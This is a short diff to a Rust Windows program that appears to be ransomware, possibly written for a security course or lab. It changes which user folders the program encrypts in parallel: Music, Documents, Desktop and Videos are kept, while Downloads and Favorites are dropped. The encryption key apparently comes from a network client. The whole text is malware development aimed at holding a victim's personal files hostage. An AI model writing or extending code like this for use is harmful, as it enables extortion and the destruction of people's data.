@@ -5,16 +5,16 @@ use std::path::PathBuf;
 use anyhow::Result;
 
 // use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
-use c_monster_co_2ic80::cryptography::chunk::DEBUG_ENABLED;
 use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
 use c_monster_co_2ic80::debug_log;
+use c_monster_co_2ic80::cryptography::chunk::{DEBUG_ENABLED};
 use c_monster_co_2ic80::networking::client::gen_key;
 
 use sodiumoxide::crypto::box_::PublicKey;
 
 use windows::{
     Win32::UI::Shell::{
-        FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Downloads, FOLDERID_Favorites, KNOWN_FOLDER_FLAG,
+        FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, KNOWN_FOLDER_FLAG,
         SHGetKnownFolderPath,
     },
     core::PWSTR,
@@ -52,11 +52,8 @@ async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
     let paths = [
         FOLDERID_Music,
         FOLDERID_Documents,
-        FOLDERID_Downloads,
-        // FOLDERID_Desktop,
-        FOLDERID_Favorites,
+        FOLDERID_Desktop,
         FOLDERID_Videos,
-        FOLDERID_Downloads,
     ];
 
     unsafe {
